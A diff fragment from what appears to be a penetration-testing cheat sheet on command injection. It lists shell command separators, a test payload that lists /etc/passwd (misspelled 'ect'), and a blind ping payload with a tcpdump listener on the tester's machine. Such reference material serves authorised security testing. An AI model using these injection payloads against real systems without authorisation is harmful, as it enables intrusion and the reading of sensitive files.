@@ -5,6 +5,7 @@ order: 4
 ---
 
 > **Test for Command Injection**
+
 Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
 Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
 Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
